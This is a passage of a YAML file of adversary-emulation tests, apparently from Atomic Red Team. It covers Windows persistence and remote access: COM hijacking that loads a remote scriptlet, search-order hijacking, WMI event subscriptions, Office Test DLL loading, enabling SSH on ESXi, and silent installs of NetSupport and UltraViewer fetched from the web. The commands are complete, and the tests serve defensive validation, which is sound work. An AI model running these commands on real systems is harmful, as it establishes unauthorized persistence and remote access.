    /f

    reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"
    /f'
  command: 'reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /ve /T REG_SZ
    /d "AtomicTest" /f

    reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00" /ve /T REG_SZ /d
    "AtomicTest" /f

    reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID" /ve /T REG_SZ /d
    "{00000001-0000-0000-0000-0000FEEDACDC}" /f

    reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID" /ve /T REG_SZ
    /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f

    reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}"
    /f

    reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}"
    /ve /T REG_SZ /d "AtomicTest" /f

    reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"
    /ve /T REG_SZ /d "C:\WINDOWS\system32\scrobj.dll" /f

    reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"
    /v "ThreadingModel" /T REG_SZ /d "Apartment" /f

    reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID"
    /ve /T REG_SZ /d "AtomicTest" /f

    reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL"
    /ve /T REG_SZ /d "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct"
    /f

    reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID"
    /ve /T REG_SZ /d "AtomicTest" /f


    reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"
    /f

    reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs"
    /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f


    rundll32.exe -sta "AtomicTest" '
  description: 'This test first create a custom CLSID class pointing to the Windows
    Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the
    location of the script to execute.

    Then, it hijacks the CLSID for the Work Folders Logon Synchronization to establish
    persistence on user logon by creating the ''TreatAs'' with the malicious CLSID
    as default value. The

    test is validated by running ''rundll32.exe -sta "AtomicTest"'' to avoid logging
    out.


    References:


    https://youtu.be/3gz1QmiMhss?t=1251


    https://github.com/enigma0x3/windows-operating-system-archaeology'
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: *id025
    mitre_defensive_measures: []
    mitre_description: "Adversaries may establish persistence by executing malicious\
      \ content triggered by hijacked references to Component Object Model (COM) objects.\
      \ COM is a system within Windows to enable interaction between software components\
      \ through the operating system.(Citation: Microsoft Component Object Model)\
      \  References to various COM objects are stored in the Registry. \n\nAdversaries\
      \ can use the COM system to insert malicious code that can be executed in place\
      \ of legitimate software through hijacking the COM references and relationships\
      \ as a means for persistence. Hijacking a COM object requires a change in the\
      \ Registry to replace a reference to a legitimate system component which may\
      \ cause that component to not work when executed. When that system component\
      \ is executed through normal system operation the adversary's code will be executed\
      \ instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects\
      \ that are used frequently enough to maintain a consistent level of persistence,\
      \ but are unlikely to break noticeable functionality within the system as to\
      \ avoid system instability that could lead to detection. "
    mitre_examples: []
    mitre_id: T1546.015
    mitre_mitigations: []
    mitre_name: Component Object Model Hijacking
    mitre_platforms: *id026
    mitre_references:
    - https://attack.mitre.org/techniques/T1546/015
    - https://www.elastic.co/blog/how-hunt-detecting-persistence-evasion-com
    - https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence
    - https://msdn.microsoft.com/library/ms694363.aspx
    mitre_related_techniques: []
  name: COM hijacking via TreatAs
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 1561de08-0b4b-498e-8261-e922f3494aae
  cleanup_command: 'Remove-Item "$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"
    -ErrorAction Ignore

    Stop-Process -Name "calculator"

    '
  command: 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:"$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"
    "PathToAtomicsFolder\T1574.008\bin\calc.cs"

    Powershell -noprofile

    '
  description: "Colibri leverages PowerShell in a unique way to maintain persistence\
    \ after a reboot. Depending on the Windows version, Colibri drops its copy in\
    \ %APPDATA%\\Local\\Microsoft\\WindowsApps and \nnames it Get-Variable.exe for\
    \ Windows 10 and above.\nhttps://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\n"
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources:
    - 'Process: Process Creation'
    - 'File: File Modification'
    - 'File: File Creation'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may execute their own malicious payloads by hijacking
      the search order used to load other programs. Because some programs do not call
      other programs using the full path, adversaries may place their own file in
      the directory where the calling program is located, causing the operating system
      to launch their malicious software at the request of the calling program.


      Search order hijacking occurs when an adversary abuses the order in which Windows
      searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001),
      the search order differs depending on the method that is used to execute the
      program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell)
      (Citation: Microsoft WinExec) However, it is common for Windows to search in
      the directory of the initiating program before searching through the Windows
      system directory. An adversary who finds a program vulnerable to search order
      hijacking (i.e., a program that does not specify the path to an executable)
      may take advantage of this vulnerability by creating a program named after the
      improperly specified program and placing it within the initiating program''s
      directory.


      For example, "example.exe" runs "cmd.exe" with the command-line argument <code>net
      user</code>. An adversary may place a program called "net.exe" within the same
      directory as example.exe, "net.exe" will be run instead of the Windows system
      utility net. In addition, if an adversary places a program called "net.com"
      in the same directory as "net.exe", then <code>cmd.exe /C net user</code> will
      execute "net.com" instead of "net.exe" due to the order of executable extensions
      defined under PATHEXT. (Citation: Microsoft Environment Property)


      Search order hijacking is also a common practice for hijacking DLL loads and
      is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).'
    mitre_examples: []
    mitre_id: T1574.008
    mitre_mitigations: []
    mitre_name: Path Interception by Search Order Hijacking
    mitre_platforms:
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1574/008
    - https://docs.microsoft.com/en-us/previous-versions//fd7hxfdd(v=vs.85)?redirectedfrom=MSDN
    - https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
    - https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec
    - https://docs.microsoft.com/en-us/previous-versions//cc723564(v=technet.10)?redirectedfrom=MSDN#XSLTsection127121120120
    mitre_related_techniques: []
  name: powerShell Persistence via hijacking default modules - Get-Variable.exe
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 280812c8-4dae-43e9-a74e-1d08ab997c0e
  cleanup_command: 'echo "" | "#{plink_file}" -batch "#{vm_host}" -ssh -l #{vm_user}
    -pw "#{vm_pass}" "vim-cmd hostsvc/disable_ssh"

    '
  command: 'echo "" | "#{plink_file}" -batch "#{vm_host}" -ssh -l #{vm_user} -pw "#{vm_pass}"
    "vim-cmd hostsvc/enable_ssh"

    '
  description: 'An adversary enables SSH on an ESXi host to maintain persistence and
    creeate another command execution interface.

    [Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#enable%20service)

    '
  get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
    -ErrorAction Ignore -Force | Out-Null

    Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"
    -OutFile "#{plink_file}"

    '
  input_arguments:
    plink_file:
      default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe
      description: Path to Plink
      type: path
    vm_host:
      default: atomic.local
      description: Specify the host name or IP of the ESXi server.
      type: string
    vm_pass:
      default: password
      description: Specify the privileged user's password.
      type: string
    vm_user:
      default: root
      description: Specify the privilege user account on the ESXi server.
      type: string
  mitre_info:
    mitre_data_sources:
    - 'Logon Session: Logon Session Creation'
    - 'Process: Process Creation'
    - 'Network Traffic: Network Connection Creation'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to log into remote machines using Secure Shell (SSH). The adversary may then\
      \ perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized\
      \ users to open remote shells on other computers. Many Linux and macOS versions\
      \ come with SSH installed by default, although typically disabled until the\
      \ user enables it. The SSH server can be configured to use standard password\
      \ authentication or public-private keypairs in lieu of or in addition to a password.\
      \ In this authentication scenario, the user\u2019s public key must be in a special\
      \ file on the computer running the server that lists which keypairs are allowed\
      \ to login as that user."
    mitre_examples: []
    mitre_id: T1021.004
    mitre_mitigations: []
    mitre_name: SSH
    mitre_platforms:
    - Linux
    - macOS
    mitre_references:
    - https://attack.mitre.org/techniques/T1021/004
    - https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins
    mitre_related_techniques: []
  name: ESXi - Enable SSH via VIM-CMD
  platforms:
  - windows
  prereq_command: 'if (Test-Path "#{plink_file}") {exit 0} else {exit 1}

    '
  references: []
- atomic_id: ecca999b-e0c8-40e8-8416-ad320b146a75
  cleanup_command: 'Stop-Process -Name "client32" -force -erroraction silentlycontinue

    '
  command: 'Start-Process "#{NetSupport_Path}" -ArgumentList "/S /v/qn"

    '
  description: "A recent trend by threat actors, once a foothold is established, maintain\
    \ long term persistence using third party remote services such as NetSupport to\
    \ provide the operator with access to the network using legitimate services. \n"
  get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
    -ErrorAction Ignore -Force | Out-Null

    (New-Object Net.WebClient).DownloadFile("https://nsproducts.azureedge.net/nsm-1270/en/Setup.exe","#{NetSupport_Path}")

    '
  input_arguments:
    NetSupport_Path:
      default: PathToAtomicsFolder\..\ExternalPayloads\T1219_NetSupport.exe
      description: Path to the NetSupport executable.
      type: path
  mitre_info:
    mitre_data_sources: &id027
    - 'Process: Process Creation'
    - 'Network Traffic: Network Traffic Flow'
    - 'Network Traffic: Network Traffic Content'
    - 'Network Traffic: Network Connection Creation'
    mitre_defensive_measures: []
    mitre_description: "An adversary may use legitimate desktop support and remote\
      \ access software to establish an interactive command and control channel to\
      \ target systems within networks. These services, such as `VNC`, `Team Viewer`,\
      \ `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring\
      \ and management (RMM) tools, are commonly used as legitimate technical support\
      \ software and may be allowed by application control within a target environment.(Citation:\
      \ Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation:\
      \ CrySyS Blog TeamSpy)\n\nRemote access software may be installed and used post-compromise\
      \ as an alternate communications channel for redundant access or as a way to\
      \ establish an interactive remote desktop session with the target system. They\
      \ may also be used as a component of malware to establish a reverse connection\
      \ or back-connect to a service or adversary-controlled system.\n \nAdversaries\
      \ may similarly abuse response features included in EDR and other defensive\
      \ tools that enable remote access.\n\nInstallation of many remote access software\
      \ may also include persistence (e.g., the software's installation routine creates\
      \ a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote\
      \ access modules/features may also exist as part of otherwise existing software\
      \ (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome Remote\
      \ Desktop)(Citation: Chrome Remote Desktop)"
    mitre_examples: []
    mitre_id: T1219
    mitre_mitigations: []
    mitre_name: Remote Access Software
    mitre_platforms: &id028
    - Linux
    - Windows
    - macOS
    mitre_references:
    - https://attack.mitre.org/techniques/T1219
    - https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf
    - https://blog.crysys.hu/2013/03/teamspy/
    - https://support.google.com/chrome/answer/1649523
    - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708
    - https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf
    mitre_related_techniques: []
  name: NetSupport - RAT Execution
  platforms:
  - windows
  prereq_command: 'if (Test-Path "#{NetSupport_Path}") {exit 0} else {exit 1}

    '
  references: []
- atomic_id: 19acf63b-55c4-4b6a-8552-00a8865105c8
  cleanup_command: 'Stop-Process -Name "UltraViewer_Desktop" -Force -ErrorAction SilentlyContinue

    '
  command: 'Start-Process -Wait -FilePath "#{UltraViewer_Path}" -Argument "/silent"
    -PassThru

    Start-Process ''C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe''

    '
  description: "A recent trend by threat actors, once a foothold is established, maintain\
    \ long term persistence using third party remote services such as UltraViewer\
    \ to provide the operator with access to the network using legitimate services.\
    \ \n"
  get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
    -ErrorAction Ignore -Force | Out-Null

    (New-Object Net.WebClient).DownloadFile("https://www.ultraviewer.net/en/UltraViewer_setup_6.5_en.exe","#{UltraViewer_Path}")

    '
  input_arguments:
    UltraViewer_Path:
      default: PathToAtomicsFolder\..\ExternalPayloads\T1219_UltraViewer.exe
      description: Path to the UltraViewer executable.
      type: path
  mitre_info:
    mitre_data_sources: *id027
    mitre_defensive_measures: []
    mitre_description: "An adversary may use legitimate desktop support and remote\
      \ access software to establish an interactive command and control channel to\
      \ target systems within networks. These services, such as `VNC`, `Team Viewer`,\
      \ `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring\
      \ and management (RMM) tools, are commonly used as legitimate technical support\
      \ software and may be allowed by application control within a target environment.(Citation:\
      \ Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation:\
      \ CrySyS Blog TeamSpy)\n\nRemote access software may be installed and used post-compromise\
      \ as an alternate communications channel for redundant access or as a way to\
      \ establish an interactive remote desktop session with the target system. They\
      \ may also be used as a component of malware to establish a reverse connection\
      \ or back-connect to a service or adversary-controlled system.\n \nAdversaries\
      \ may similarly abuse response features included in EDR and other defensive\
      \ tools that enable remote access.\n\nInstallation of many remote access software\
      \ may also include persistence (e.g., the software's installation routine creates\
      \ a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote\
      \ access modules/features may also exist as part of otherwise existing software\
      \ (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome Remote\
      \ Desktop)(Citation: Chrome Remote Desktop)"
    mitre_examples: []
    mitre_id: T1219
    mitre_mitigations: []
    mitre_name: Remote Access Software
    mitre_platforms: *id028
    mitre_references:
    - https://attack.mitre.org/techniques/T1219
    - https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf
    - https://blog.crysys.hu/2013/03/teamspy/
    - https://support.google.com/chrome/answer/1649523
    - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708
    - https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf
    mitre_related_techniques: []
  name: UltraViewer - RAT Execution
  platforms:
  - windows
  prereq_command: 'if (Test-Path "#{UltraViewer_Path}") {exit 0} else {exit 1}

    '
  references: []
- atomic_id: 3c64f177-28e2-49eb-a799-d767b24dd1e0
  cleanup_command: '$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription
    -Class CommandLineEventConsumer -Filter "Name = ''AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example''"

    $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter
    -Filter "Name = ''AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example''"

    $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query
    "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
    -ErrorAction SilentlyContinue

    $FilterConsumerBindingToCleanup | Remove-WmiObject

    $EventConsumerToCleanup | Remove-WmiObject

    $EventFilterToCleanup | Remove-WmiObject

    '
  command: "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n\
    \                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"\
    WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN\
    \ 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime\
    \ >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=New-CimInstance -Namespace\
    \ root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs\
    \ = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n\
    \                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\"\
    ;}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer\
    \ -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\n\
    Consumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace\
    \ root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n"
  description: 'Run from an administrator powershell window. After running, reboot
    the victim machine.

    After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.


    Code references


    https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af


    https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: &id029
    - 'File: File Creation'
    - 'Process: Process Creation'
    - 'Command: Command Execution'
    - 'WMI: WMI Creation'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may establish persistence and elevate privileges\
      \ by executing malicious content triggered by a Windows Management Instrumentation\
      \ (WMI) event subscription. WMI can be used to install event filters, providers,\
      \ consumers, and bindings that execute code when a defined event occurs. Examples\
      \ of events that may be subscribed to are the wall clock time, user login, or\
      \ the computer's uptime.(Citation: Mandiant M-Trends 2015)\n\nAdversaries may\
      \ use the capabilities of WMI to subscribe to an event and execute arbitrary\
      \ code when that event occurs, providing persistence on a system.(Citation:\
      \ FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile\
      \ WMI scripts \u2013 using `mofcomp.exe`  \u2013into Windows Management Object\
      \ (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation:\
      \ Dell WMI Persistence)(Citation: Microsoft MOF May 2018)\n\nWMI subscription\
      \ execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus\
      \ may result in elevated SYSTEM privileges."
    mitre_examples: []
    mitre_id: T1546.003
    mitre_mitigations: []
    mitre_name: Windows Management Instrumentation Event Subscription
    mitre_platforms: &id030
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1546/003
    - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
    - https://www.secureworks.com/blog/wmi-persistence
    - https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf
    - https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96
    - https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1
    - https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf
    - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    - https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-
    mitre_related_techniques: []
  name: Persistence via WMI Event Subscription - CommandLineEventConsumer
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: fecd0dfd-fb55-45fa-a10b-6250272d0832
  cleanup_command: '$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription
    -Class ActiveScriptEventConsumer -Filter "Name = ''AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example''"

    $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter
    -Filter "Name = ''AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example''"

    $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query
    "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
    -ErrorAction SilentlyContinue

    $FilterConsumerBindingToCleanup | Remove-WmiObject

    $EventConsumerToCleanup | Remove-WmiObject

    $EventFilterToCleanup | Remove-WmiObject

    '
  command: "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n\
    \                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"\
    WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN\
    \ 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime\
    \ >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=Set-WmiInstance -Class\
    \ __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs\n\n$ConsumerArgs\
    \ = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n\
    \                ScriptingEngine='VBScript';\n                ScriptText='\n \
    \               Set objws = CreateObject(\"Wscript.Shell\")\n                objws.Run\
    \ \"notepad.exe\", 0, True\n                '}\n$Consumer=Set-WmiInstance -Namespace\
    \ \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs\n\
    \n$FilterToConsumerArgs = @{\nFilter = $Filter;\nConsumer = $Consumer;\n}\n$FilterToConsumerBinding\
    \ = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding'\
    \ -Arguments $FilterToConsumerArgs\n"
  description: 'Run from an administrator powershell window. After running, reboot
    the victim machine.

    After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.


    Code references


    https://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: *id029
    mitre_defensive_measures: []
    mitre_description: "Adversaries may establish persistence and elevate privileges\
      \ by executing malicious content triggered by a Windows Management Instrumentation\
      \ (WMI) event subscription. WMI can be used to install event filters, providers,\
      \ consumers, and bindings that execute code when a defined event occurs. Examples\
      \ of events that may be subscribed to are the wall clock time, user login, or\
      \ the computer's uptime.(Citation: Mandiant M-Trends 2015)\n\nAdversaries may\
      \ use the capabilities of WMI to subscribe to an event and execute arbitrary\
      \ code when that event occurs, providing persistence on a system.(Citation:\
      \ FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile\
      \ WMI scripts \u2013 using `mofcomp.exe`  \u2013into Windows Management Object\
      \ (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation:\
      \ Dell WMI Persistence)(Citation: Microsoft MOF May 2018)\n\nWMI subscription\
      \ execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus\
      \ may result in elevated SYSTEM privileges."
    mitre_examples: []
    mitre_id: T1546.003
    mitre_mitigations: []
    mitre_name: Windows Management Instrumentation Event Subscription
    mitre_platforms: *id030
    mitre_references:
    - https://attack.mitre.org/techniques/T1546/003
    - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
    - https://www.secureworks.com/blog/wmi-persistence
    - https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf
    - https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96
    - https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1
    - https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf
    - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    - https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-
    mitre_related_techniques: []
  name: Persistence via WMI Event Subscription - ActiveScriptEventConsumer
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 29786d7e-8916-4de6-9c55-be7b093b2706
  cleanup_command: '$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription
    -Class CommandLineEventConsumer -Filter "Name = ''AtomicRedTeam_consumer''"

    $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter
    -Filter "Name = ''AtomicRedTeam_filter''"

    $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query
    "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
    -ErrorAction SilentlyContinue

    $FilterConsumerBindingToCleanup | Remove-WmiObject

    $EventConsumerToCleanup | Remove-WmiObject

    $EventFilterToCleanup | Remove-WmiObject

    '
  command: '#{mofcomp_path} "#{mof_file}"

    '
  description: "The following Atomic will utilize MOFComp.exe to load a local MOF\
    \ file.\nThe Managed Object Format (MOF) compiler parses a file containing MOF\
    \ statements and adds the classes and class instances defined in the file to the\
    \ WMI repository. \nTo query for the class:  gwmi __eventfilter -namespace root\\\
    subscription\nA successful execution will add the class to WMI root namespace.\n\
    Reference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/\
    \ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.\n"
  get_prereq_command: 'Validate MOFComp.exe is on disk somewhere and update input
    argument.

    '
  input_arguments:
    mof_file:
      default: PathToAtomicsFolder\T1546.003\src\T1546.003.mof
      description: Local location MOF file
      type: string
    mofcomp_path:
      default: c:\windows\system32\wbem\mofcomp.exe
      description: Location of mofcomp.exe
      type: string
  mitre_info:
    mitre_data_sources: *id029
    mitre_defensive_measures: []
    mitre_description: "Adversaries may establish persistence and elevate privileges\
      \ by executing malicious content triggered by a Windows Management Instrumentation\
      \ (WMI) event subscription. WMI can be used to install event filters, providers,\
      \ consumers, and bindings that execute code when a defined event occurs. Examples\
      \ of events that may be subscribed to are the wall clock time, user login, or\
      \ the computer's uptime.(Citation: Mandiant M-Trends 2015)\n\nAdversaries may\
      \ use the capabilities of WMI to subscribe to an event and execute arbitrary\
      \ code when that event occurs, providing persistence on a system.(Citation:\
      \ FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile\
      \ WMI scripts \u2013 using `mofcomp.exe`  \u2013into Windows Management Object\
      \ (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation:\
      \ Dell WMI Persistence)(Citation: Microsoft MOF May 2018)\n\nWMI subscription\
      \ execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus\
      \ may result in elevated SYSTEM privileges."
    mitre_examples: []
    mitre_id: T1546.003
    mitre_mitigations: []
    mitre_name: Windows Management Instrumentation Event Subscription
    mitre_platforms: *id030
    mitre_references:
    - https://attack.mitre.org/techniques/T1546/003
    - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
    - https://www.secureworks.com/blog/wmi-persistence
    - https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf
    - https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96
    - https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1
    - https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf
    - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    - https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-
    mitre_related_techniques: []
  name: Windows MOFComp.exe Load MOF File
  platforms:
  - windows
  prereq_command: 'if (Test-Path "#{mofcomp_path}") { exit 0} else { exit 1}

    '
  references: []
- atomic_id: c3e35b58-fe1c-480b-b540-7600fb612563
  cleanup_command: 'Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore

    Remove-Item "HKCU:\Software\Microsoft\Office test\Special\Perf" -ErrorAction Ignore'
  command: "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"\
    Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\\
    Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\\
    T1137.002\\bin\\officetest_x64.dll\" /f       \n}\nelse{\n  Write-Host \"32-bit\
    \ Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\\
    Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\"\
    \ /f\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n"
  description: 'Office Test Registry location exists that allows a user to specify
    an arbitrary DLL that will be executed every time an Office

    application is started. Key is used for debugging purposes. Not created by default
    & exist in HKCU & HKLM hives.

    '
  get_prereq_command: 'Write-Host "You will need to install Microsoft Word manually
